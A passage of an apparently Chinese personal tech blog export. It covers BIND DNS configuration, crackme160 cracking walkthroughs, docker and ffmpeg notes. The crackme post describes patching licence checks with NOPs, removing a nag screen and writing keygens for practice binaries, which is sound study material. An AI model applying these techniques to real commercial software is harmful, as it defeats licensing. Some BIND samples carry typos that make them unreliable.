<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logging &#123;</span><br><span class="line">channel string &#123;</span><br><span class="line">    file log_file;</span><br><span class="line">    syslog optional_facility;</span><br><span class="line">    null;</span><br><span class="line">    stderr;</span><br><span class="line">    severity log_severity;</span><br><span class="line">    print-time boolean;</span><br><span class="line">    print-severity boolean;</span><br><span class="line">    print-category boolean;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">category string &#123; string; ... &#125;;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">在日志中主要有两个概念：通道（channel）和类别（category）。通道指定了应该向哪里发送日志数据：是发送给syslog，还是写在一个文件里，或是发送给named的标准错误输出，还是发送到位存储桶（bit bucket）。类别则规定了哪些数据需要记录。下面我们主要介绍一下文件通道和类别。</span><br><span class="line">*/</span><br><span class="line">/* </span><br><span class="line">log_severity级别：</span><br><span class="line">critical</span><br><span class="line">error</span><br><span class="line">warning</span><br><span class="line">notice</span><br><span class="line">info</span><br><span class="line">debug [ level ]</span><br><span class="line">dynamic</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">category语句是指定哪一种类别的数据使用哪个或者哪几个已经定义了的通道。在bind9中类别有：</span><br><span class="line">default 类别匹配所有未明确指定通道的类别，但是不匹配不属于任何类别的消息。这些不属于任何类别的消息属于下面列出的这些类别。</span><br><span class="line">general 包括所有未明确分类的BIND消息。</span><br><span class="line">client 处理客户端请求。</span><br><span class="line">config 配置文件分析和处理。</span><br><span class="line">database 同BIND内部数据库相关的消息，用来存储区数据和缓存记录。</span><br><span class="line">dnssec 处理DNSSEC签名的响应。</span><br><span class="line">lame-servers 发现错误授权。</span><br><span class="line">network 网络操作</span><br><span class="line">notify 异步区变动通知。</span><br><span class="line">queries 查询日志</span><br><span class="line">resolver 名字解析，包括对来自解析器的递归查询的处理。</span><br><span class="line">security 认可/非认可的请求。</span><br><span class="line">update 动态更新事件。</span><br><span class="line">xfer-in 从远程名字服务器到本地名字服务器的区传送。</span><br><span class="line">xfer-out 从本地名字服务器到远程名字服务器的区传送。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
<h4 id="日志文件配置样例">日志文件配置样例：</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logging&#123;</span><br><span class="line">	channel query_log&#123;</span><br><span class="line">		file &quot;query.log&quot;  versions 3 size 20m; //最大保存三份，每份最大20m</span><br><span class="line">		severity info;</span><br><span class="line">		print_time true;</span><br><span class="line">	&#125;;</span><br><span class="line">	categray queries&#123;</span><br><span class="line">		query_log;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="include引入其他文件">include：引入其他文件</h3>
<p><strong>定义格式</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inlude filename;</span><br></pre></td></tr></table></figure>
<h3 id="keys秘钥">keys：秘钥</h3>
<p><strong>不用人未定义，使用rndc-confgen可生成配置信息</strong></p>
<h3 id="controls控制">controls:控制</h3>
<p><strong>定义格式</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">controls &#123;</span><br><span class="line">inet ( ipv4_address | ipv6_address | * )</span><br><span class="line">[ port ( integer | * ) ]</span><br><span class="line"></span><br><span class="line">allow &#123; address_match_element; ... &#125;</span><br><span class="line"></span><br><span class="line">[ keys &#123; string; ... &#125; ];</span><br><span class="line"></span><br><span class="line">unix unsupported; // not implemented</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="控制配置文件样例">控制配置文件样例：</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">controls &#123;  </span><br><span class="line">     inet 127.0.0.1 port 953    //在127.0.0.1接口的953号端口进行监听  </span><br><span class="line">        allow &#123; 127.0.0.1; &#125;    //只接受127.0.0.1的连接，即只有在本机使用rndc,才能对named进行控制  </span><br><span class="line">       keys &#123; &quot;rndckey&quot;; &#125;;     //使用名为rndckey的密钥才能访问  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="区域配置文件">区域配置文件</h3>
<p><strong>在配置文件中以file来指定区域配置文件的位置</strong></p>
<h4 id="正向区域文件样例">正向区域文件样例：</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat db.club </span><br><span class="line">$TTL	3600</span><br><span class="line">$ORIGIN	divint3.club.</span><br><span class="line"></span><br><span class="line">@	IN	SOA	divint3.club. divint3.gmail.com. (</span><br><span class="line">			2003221		; Serial</span><br><span class="line">			 604800		; Refresh</span><br><span class="line">			  86400		; Retry</span><br><span class="line">			2419200		; Expire</span><br><span class="line">			 604800 )	; Negative Cache TTL</span><br><span class="line">;</span><br><span class="line">@	IN	NS	ns1.divint3.club.</span><br><span class="line">@	IN	NS	ns2.divint3.club.</span><br><span class="line">@	IN	A	47.93.124.161</span><br><span class="line">www	IN	A	47.93.124.161</span><br><span class="line">ns1	IN	A	47.93.124.161</span><br><span class="line">ns2	IN	A	47.93.124.161</span><br></pre></td></tr></table></figure>
<h4 id="反向区域文件配置">反向区域文件配置：</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat db.47</span><br><span class="line">$TTL	3600</span><br><span class="line"></span><br><span class="line">124.93.47.in-addr.arpa.	IN	SOA	divint3.club.	divint3.gmail.com. (</span><br><span class="line">					20032201	;</span><br><span class="line">					1D		;</span><br><span class="line">					1H		;</span><br><span class="line">					1W		;</span><br><span class="line">					3H 		;</span><br><span class="line">);</span><br><span class="line">@	IN	NS	ns1.divint3.club.</span><br><span class="line">@	IN	NS	ns2.divint3.club.</span><br><span class="line">9	IN	PTR	ns1.divint3.club.</span><br><span class="line">9	IN	PTR	ns2.divint3.club.</span><br><span class="line">9	IN	PTR	www.divint3.club.</span><br></pre></td></tr></table></figure>
<h2
id="注册配置网络dns服务器-以阿里云为例">注册配置网络dns服务器-以阿里云为例</h2>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/管理按钮.png" /></p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/自定义dns服务器.png" /></p>
<p><strong>注意</strong>：网络dns服务器生效需要时间注册，并不是设置完之后直接可用，一定要在自己的dns服务器上写出dns服务器自己的A记录。</p>
]]></content>
      <categories>
        <category>运维</category>
      </categories>
  </entry>
  <entry>
    <title>crackme160</title>
    <url>/crackme160/</url>
    <content><![CDATA[<h1 id="介绍">介绍</h1>
<p>软件破解相关知识。</p>
<span id="more"></span>
<h2 id="破解">破解</h2>
<h3 id="acid-burn">Acid burn</h3>
<h4 id="破解-1">破解</h4>
<ol type="1">
<li>首先查壳是VC写的。使用BP快捷操作中的<code>BP MessageBoxA</code>操作对消息框进行截断,</li>
</ol>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220606191323333.png" /></p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220606191422299.png" /></p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220606191641310.png" /></p>
<ol start="2" type="1">
<li>运行程序，进入<code>Serial/Name</code>子程序，输入任意字符串,点击<code>Check It Baby</code>。</li>
</ol>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220606191941258.png" /></p>
<ol start="3" type="1">
<li>进入调用堆栈<code>Alt+K</code>或者小按钮<code>k</code>查看,找到调用函数，右键显示调用.</li>
</ol>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220606192210768.png" /></p>
<ol start="4" type="1">
<li>向上翻找，找到入口处，设下断点。</li>
</ol>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220606192358989.png" /></p>
<ol start="5" type="1">
<li>再次运行程序，在断点处截断，查看右下角堆栈处右键选择反汇编窗口跟随。或者再次通过<code>Alt+k</code>找到调用堆栈，跳转至调用函数。</li>
</ol>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220606192817037.png" /></p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220606193102859.png" /></p>
<ol start="6" type="1">
<li><p>找到注册码生成的核心逻辑。</p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220606201218401.png" /></p></li>
</ol>
<h4 id="注册机">注册机</h4>
<ol type="1">
<li>核心逻辑</li>
</ol>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220606200946474.png" /></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span>* serial=<span class="string">&quot;abcd&quot;</span>;</span><br><span class="line">	<span class="type">int</span> tmp1 = serial[<span class="number">0</span>];</span><br><span class="line">	<span class="type">int</span> tmp2 = tmp1*<span class="number">0x29</span>;</span><br><span class="line">	<span class="type">int</span> tmp3 = tmp2+tmp2;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;CW-%d-CRACKED&quot;</span>,tmp3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol start="2" type="1">
<li>注册码组装。</li>
</ol>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220606201030824.png" /></p>
<ol start="3" type="1">
<li>点击<code>Serial</code>按钮，进入子程序，和上面方法一样，<code>BP MessageBoxA</code>下断点。最后找到固定的注册码。</li>
</ol>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220606202444766.png" /></p>
<h3 id="afkayas.1">Afkayas.1</h3>
<h4 id="破解-2">破解</h4>
<ol type="1">
<li>查壳是VB写的，正常运行程序发现有MessageBox，故使用VB的快速特征断点。<code>BP rtcMsgBox</code>，运行程序，输入伪码，断下程序。</li>
</ol>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220607131456577.png" /></p>
<ol start="2" type="1">
<li>查看调用堆栈，追踪最上面的目标，就是函数调用方的地址，右键。跟随目标。</li>
</ol>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220607131634054.png" /></p>
<ol start="3" type="1">
<li>向上寻找关键跳转，设置断点，使用nop填充，使用补丁修补文件输出到破解软件。</li>
</ol>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220607131836246.png" /></p>
<h4 id="注册机-1">注册机</h4>
<ol type="1">
<li>在这个代码块中寻找注册码计算逻辑,分析得知,edi=6
edi*0x17cfb,然后乘以用户名第一位的ascii码的算法.</li>
</ol>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220607191306503.png" /></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span>* serial=<span class="string">&quot;abcd&quot;</span>;</span><br><span class="line">	<span class="type">int</span> tmp1 = serial[<span class="number">0</span>];</span><br><span class="line">	<span class="type">int</span> tmp2 = tmp1*<span class="number">0x29</span>;</span><br><span class="line">	<span class="type">int</span> tmp3 = tmp2+tmp2;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;CW-%d-CRACKED&quot;</span>,tmp3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="afkayas.2">Afkayas.2</h3>
<h4 id="破解-3">破解</h4>
<ol type="1">
<li>破解方法同上。</li>
<li>去除Nag。使用4C方法。先找到入口处入栈的地址<code>0x4067D4</code>，在数据窗口总使用表达式找到4C偏移处的内存地址。</li>
</ol>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220607192350111.png" /></p>
<ol start="3" type="1">
<li>找到第一个位置的内存地址，右键，在内存敞口中转到指定的<code>DWORD</code>。</li>
</ol>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220607192441572.png" /></p>
<ol start="4" type="1">
<li>这个地址我们能够看到两块相似数据，在第37块数据上，我们能够发现两个不一样的数据，一个是<code>00</code>，另一个是<code>01</code>，这个标志位标识了窗口的启动顺序，如果我们调换启动顺序，则可以消除Nag窗口，最后写出破解程序。</li>
</ol>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220607192836820.png" /></p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220607193200816.png" /></p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220607193257547.png" /></p>
<h4 id="注册机-2">注册机</h4>
<ol type="1">
<li>注册机无法修改Nga窗口的启动顺序。</li>
<li>向上寻找。</li>
</ol>
<p>算法如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 使用name: 111111</span></span><br><span class="line">    <span class="comment">// 使用serial: 222222</span></span><br><span class="line">    <span class="type">int</span> tmp1 = <span class="number">6</span>;</span><br><span class="line">    <span class="type">int</span> tmp2 = <span class="number">6</span> * <span class="number">88888</span>;</span><br><span class="line">    <span class="type">int</span> tmp3 = tmp2 + <span class="number">0x31</span>;</span><br><span class="line">    <span class="comment">// printf(&quot;%x\n&quot;, tmp3);</span></span><br><span class="line">    <span class="comment">// printf(&quot;%d\n&quot;, tmp3);</span></span><br><span class="line">    <span class="type">double</span> tmp4 = tmp3;</span><br><span class="line">    <span class="type">double</span> tmp5 = tmp4 + <span class="number">2</span>;</span><br><span class="line">    <span class="type">double</span> tmp6 = tmp5 * <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf(&quot;%f\n&quot;, tmp6);</span></span><br><span class="line">    <span class="type">double</span> tmp7 = tmp6 - <span class="number">2</span>;</span><br><span class="line">    <span class="type">double</span> tmp8 = tmp7+<span class="number">15</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>, tmp8);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ckme">CKme</h3>
<h4 id="破解-4">破解</h4>
<p>由于x64dbg出现了向后反汇编错误，故本次破解使用了Ollydbg.</p>
<ol type="1">
<li>本项目中查壳发现是Dolphin编写的，故使用各种常规断点，无法断下程序。后使用<code>E2A（Dolphin事件到地址查询工具）</code>，得到输入框2中有<code>OneKeyUp</code>事件，函数名<code>chkcode</code>，根据函数地址下断点，<code>BP 457C40</code>。</li>
</ol>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220608150737478.png" /></p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220608150942382.png" /></p>
<ol start="2" type="1">
<li><p>输入伪码，运行程序,使用单步跟踪。</p></li>
<li><p>发现可疑call，因为发现疑似注册码的字符串被这个call处理了，故步入此call。</p></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00457CA4  |.  E8 93BFFAFF     call CKme.00403C3C</span><br></pre></td></tr></table></figure>
<ol start="4" type="1">
<li>单步步过，发现注册码在一个循环体中拼接完成。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00403C5A   &gt; /8B449C 14     mov eax,dword ptr ss:[esp+ebx*4+0x14]</span><br><span class="line">00403C5E   . |89F2          mov edx,esi</span><br><span class="line">00403C60   . |85C0          test eax,eax</span><br><span class="line">00403C62   . |74 0A         je short CKme.00403C6E</span><br><span class="line">00403C64   . |8B48 FC       mov ecx,dword ptr ds:[eax-0x4]</span><br><span class="line">00403C67   . |01CE          add esi,ecx</span><br><span class="line">00403C69   . |E8 76EBFFFF   call CKme.004027E4</span><br><span class="line">00403C6E   &gt; |4B            dec ebx</span><br><span class="line">00403C6F   .^\75 E9         jnz short CKme.00403C5A</span><br></pre></td></tr></table></figure>
<ol start="5" type="1">
<li>当循环跳出时，在栈帧中发现疑似的注册码。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0019FB54   02325788  ASCII &quot;黑头Sun Bird11dseloffc-012-OK111111&quot;</span><br></pre></td></tr></table></figure>
<ol start="6" type="1">
<li>暂时解除所有断点，进行注册码测试，在后续代码中发现对比流程。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00457D2C  |.  8B45 E0       mov eax,[local.8]                        ;  用户输入的注册码</span><br><span class="line">00457D2F  |.  8B93 18030000 mov edx,dword ptr ds:[ebx+0x318]         ;  计算出来的注册码</span><br><span class="line">00457D35  |.  E8 52BFFAFF   call CKme.00403C8C                       ;  对比注册码</span><br><span class="line">00457D3A  |.  75 0A         jnz short CKme.00457D46                  ;  关键跳转</span><br><span class="line">00457D3C  |.  C783 0C030000&gt;mov dword ptr ds:[ebx+0x30C],0x3E        ;  存入0x3e</span><br></pre></td></tr></table></figure>
<ol start="7" type="1">
<li>当输入正确的注册码后，这里不会执行跳转，而是讲一个数据存入了数据地址中。发现注册成功的标志并没有显示出来，所以猜测，注册码比对事件不是在<code>chkcode</code>函数中实现的，而是另外实现的，所以寻找其他事件地址，进行调试，我们发现panel上面有两个事件，<code>onclick</code>和<code>ondbclick</code>，故需要分别调试，不然<code>ondbclick</code>可能会被<code>onclick</code>事件获取。首先，不进行断点注册，使用单击panel发现没有反应，双击后象征注册成功的照片出现，说明对比事件发生在<code>ondbclick</code>事件中,对双击事件的地址<code>00457E7C</code>下断点。发现在这里对数据进行了对比，如果对比成功，则写入0x85。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00457EF5  |.  83BE 0C030000&gt;cmp dword ptr ds:[esi+0x30C],0x3E        ;  数据对比</span><br><span class="line">00457EFC  |.  75 0A         jnz short CKme.00457F08</span><br><span class="line">00457EFE  |.  C786 0C030000&gt;mov dword ptr ds:[esi+0x30C],0x85</span><br></pre></td></tr></table></figure>
<ol start="8" type="1">
<li>对<code>onclick</code>事件下断点，对panel进行单击，发现这里会对<code>0x30C</code>处的数据进行比对，如果比对成功，则不会跳过下面的流程，注册成功的信息也会显示出来。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00458031  |.  81BE 0C030000&gt;cmp dword ptr ds:[esi+0x30C],0x85</span><br><span class="line">0045803B  |.  75 76         jnz short CKme.004580B3</span><br></pre></td></tr></table></figure>
<h4 id="注册机-3">注册机</h4>
<p>这个注册机很简单，就是<code>黑头Sun Bird11dseloffc-012-OK</code>拼接用户名即可。</p>
<h2 id="出现的函数">出现的函数</h2>
<p><code>vbaR8Str</code>：将整数转换为双精度小数</p>
<p><code>vbaStrI4</code>: 转换数字到字符串的函数</p>
<h2 id="遇到的问题">遇到的问题</h2>
<h2 id="x64dbg出现的问题">x64dbg出现的问题</h2>
<p><a href="https://52sbl.cn/discussion/28574.html">逆向工程 - 强制解释
x64dbg 中的代码 向后反编译的问题 (52sbl.cn)</a></p>
<h3
id="dolphin在win10系统上出现的问题">Dolphin在Win10系统上出现的问题</h3>
<p>在脱壳时IAT修复失败,常常会出现找不到的函数。</p>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>docker swarm配置</title>
    <url>/docker-swarm%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h3 id="初始化swarm集群">初始化swarm集群</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker swarm init --advertise-addr=$(本机公网IP地址) --data-path-port=6789</span><br></pre></td></tr></table></figure>
<ul>
<li>为什么要变更数据端口呢?因为腾讯云会拦截原有端口上的数据报文,导致集群无法正常工作,现象是overlaynetwork无法链接到任意节点</li>
</ul>
<h3 id="加入swarm集群">加入swarm集群</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker swarm <span class="built_in">join</span> --token $(token) $(集群manager公网IP地址):2377 --advertise-addr=$(本机公网IP地址)</span><br></pre></td></tr></table></figure>
<h2 id="参考资料">参考资料</h2>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>docker-笔记</title>
    <url>/docker-%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="docker-笔记">docker-笔记</h1>
<h4 id="概念">概念</h4>
<blockquote>
<p>你从仓库里pull的文件叫做镜像，只可读，不可写 当你执行<strong>docker
run</strong>的时候，系统会创建一个容器，而他是可读可写的，所有的修改都是建立在容器层上
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">└── 只读层-镜像</span><br><span class="line">    └──可读可写层-容器</span><br></pre></td></tr></table></figure> - 为了方便数据共享 所以形成了镜像与容器的概念 -
即使你修改了docker中的文件,被修改的也只是<strong>容器</strong>层，只读层
不会发生任何改变，所以可以镜像复用 -
当exit结束docker中的交互式shell后,容器的内容仍会保留(可以指定docker -rm
指定镜像启动的容器 来删除容器内的修改)</p>
</blockquote>
<p>由于 <strong>union fs</strong>结构
使镜象中的层可以像动态链接库一样继承,复用 <span id="more"></span></p>
<hr />
<h4 id="命令">命令</h4>
<p>拉取镜像 <strong>pull</strong></p>
<p><code>$ docker pull ubuntu:16.04</code></p>
<p>运行镜像 <strong>run</strong></p>
<p><code>$ docker run -it --rm ubuntu:16.04 bash</code>
<code>$ docker run --name webserver -d -p 80:80 nginx</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">相关参数:</span><br><span class="line">--name: 命名</span><br><span class="line">--rm: 这个参数是说容器退出后随之将其删除</span><br><span class="line">-i:	交互式操作</span><br><span class="line">-t:	终端</span><br><span class="line">-d: 后台运行</span><br><span class="line">bash:所运行的命令</span><br></pre></td></tr></table></figure>
<p>列出镜像 <strong>image ls</strong> <code>$ docker image ls</code></p>
<p>删除虚悬镜像 <strong>image prune</strong>
<code>$ docker image prune</code></p>
<p>中间层镜像 <strong>image ls -a</strong>
<code>$ docker image ls -a</code></p>
<p>删除本地镜像 <strong>image rm</strong>
<code>$ docker image rm [选项] &lt;镜像1&gt;</code>
<code>$ docker image rm 501(根据id删除镜像文件,一般取前三位)</code></p>
<p>进入容器 <strong>exec</strong>
<code>$ docker exec -it webserver bash</code></p>
<p>查看后台容器 <strong>container ls</strong>
<code>$ docker container ls</code></p>
<p>查看所有容器 <strong>container ls -a</strong>
<code>$ docker container ls -a</code></p>
<p>附加到后台容器 <strong>attatch</strong>
<code>$ docker attatch [container id]</code></p>
<p>容器保存为镜像的命令 <strong>commit</strong>
<code>docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]]</code></p>
<p>docker network 查看docker的网络信息</p>
<p>docker port 查看端口</p>
<p>docker logs -f 跟踪查看容器日志</p>
<p>自定义docker0网桥信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">	&quot;bip&quot;:&quot;192.168.1.5/24&quot;, //bridge ip</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="docker-run---network-参数">docker run --network 参数</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">container:容器名 //与其他容器共享网络命名空间 </span><br><span class="line">host //与宿主机共享网络命名空间</span><br><span class="line">none //无网卡的网络命名空间，只有一个lo本地回环</span><br><span class="line">bridge //桥接，可以通过-p来向外映射端口</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="dockerfile-编写">dockerfile 编写</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令:</span><br><span class="line">    RUN	执行命令</span><br><span class="line">    COPY 复制文件</span><br><span class="line">    FROM 指定基础镜像</span><br><span class="line">    ADD 更高级的复制文件</span><br><span class="line">    CMD 容器启动命令</span><br><span class="line">    ENTRYPOINT 入口点</span><br><span class="line">    ENV 设置环境变量</span><br><span class="line">    ARG 构建参数</span><br><span class="line">    VOLUME 定义匿名卷</span><br><span class="line">    EXPOSE 声明端口</span><br><span class="line">    WORKDIR 指定工作目录</span><br><span class="line">    USER 指定当前用户</span><br><span class="line">    HEALTHCHECK 健康检查</span><br><span class="line">首先写出一个Dockerfile</span><br><span class="line">	$ docker build -t 镜像名:标签 .(点代表当前目录,由于docker上传Dockermakefile到服务端,形成了上下文概念,所以要使用相对路径,不可以使用绝对路径,因为绝对路径会超出上下文的管理范围)</span><br><span class="line">	cat Dockerfile | docker build -</span><br><span class="line">	##如果标准输入传入的是文本文件，则将其视为 Dockerfile，并开始构建。这种形式由于直接从标准输入中读取 Dockerfile 的内容，它没有上下文，因此不可以像其他方法那样可以将本地文件 COPY 进镜像之类的事情</span><br><span class="line">	</span><br><span class="line">	COPY 指令将从构建上下文目录中 &lt;源路径&gt; 的文件/目录复制到新的一层的镜像内的 &lt;目标路径&gt; 位置。比如：</span><br><span class="line">	COPY package.json /usr/src/app/##上下文路径中,只能使用相对路径,因为会上传当前目录所有文件到上下文目录中,所以只能当前目录的相对路径,指定其他路径超出上下文目录管理范围</span><br><span class="line">	</span><br><span class="line">	ENTRYPOINT 是默认执行的，不会被替换掉</span><br><span class="line">	CMD可能会被docker run 镜像名 参数，替换掉</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>运维</category>
      </categories>
  </entry>
  <entry>
    <title>drone流水线使用软链接替换版本</title>
    <url>/drone%E6%B5%81%E6%B0%B4%E7%BA%BF%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%93%BE%E6%8E%A5%E6%9B%BF%E6%8D%A2%E7%89%88%E6%9C%AC/</url>
    <content><![CDATA[<h2 id="流程">流程</h2>
<ol type="1">
<li>编译</li>
<li>拷贝</li>
<li>重命名</li>
<li>存储</li>
<li>软连接重定向</li>
<li>运行</li>
<li>检查运行状态</li>
<li>运行失败</li>
<li>回退版本-重新指向上个版本</li>
</ol>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>esp32资料</title>
    <url>/esp32%E8%B5%84%E6%96%99/</url>
    <content><![CDATA[<h2 id="参考资料">参考资料</h2>
<p><a
href="https://docs.espressif.com/projects/esp-idf/zh_CN/latest/esp32/get-started/index.html">快速入门
- ESP32 - — ESP-IDF 编程指南 latest 文档 (espressif.com)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/349721245">ESP-MESH
无线组网，让智能家居通信组网更方便 | ESP32轻松学（Arduino版） - 知乎
(zhihu.com)</a></p>
<p><a
href="https://www.caffreyfans.top/2020/12/31/SPI%20Flash%20Modes/">SPI
Flash Modes 介绍 | Caffreyfans</a></p>
<p><a
href="https://blog.csdn.net/stcaaa/article/details/89474013">串口调试工具中的DTR和RTS是什么意思_SunSkyCity的博客-CSDN博客_dtr
rts</a></p>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>ffmpeg实用命令</title>
    <url>/ffmpeg%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="视频操作">视频操作</h2>
<h3 id="视频切片">视频切片</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `<span class="built_in">ls</span> -l | awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span> | grep <span class="string">&quot;mp4&quot;</span>`;<span class="keyword">do</span></span><br><span class="line">	ffmpeg -i <span class="variable">$i</span> -c copy -map 0 -f segment -segment_list `<span class="built_in">echo</span> <span class="variable">$i</span> | awk -F <span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`.m3u8 -segment_time 20 `<span class="built_in">echo</span> <span class="variable">$i</span> | awk -F <span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`-%05d.ts; </span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="字幕操作">字幕操作</h2>
<h3 id="添加ass字幕">添加ASS字幕</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffmpeg -i input.mp4 -vf “ass=subtitle.ass” output.mp4</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="添加srt字幕">添加SRT字幕</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffmpeg -y -i input.mp4 -vf subtitles=input.srt -c:v libx264 -c:a libvo_aacenc -preset slow -crf 10 output-burnt.mp4</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="srt字幕转换ass字幕">SRT字幕转换ASS字幕</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffmpeg -i subtitle.srt subtitle.ass</span><br></pre></td></tr></table></figure>
<h2 id="参考资料">参考资料</h2>
<p><a href="https://www.ruanyifeng.com/blog/2020/01/ffmpeg.html">FFmpeg
视频处理入门教程 - 阮一峰的网络日志 (ruanyifeng.com)</a> <a
href="https://static.kancloud.cn/zhenhuamcu/ffmpeg">ffmpeg命令大全以及视频教程</a></p>
]]></content>
  </entry>
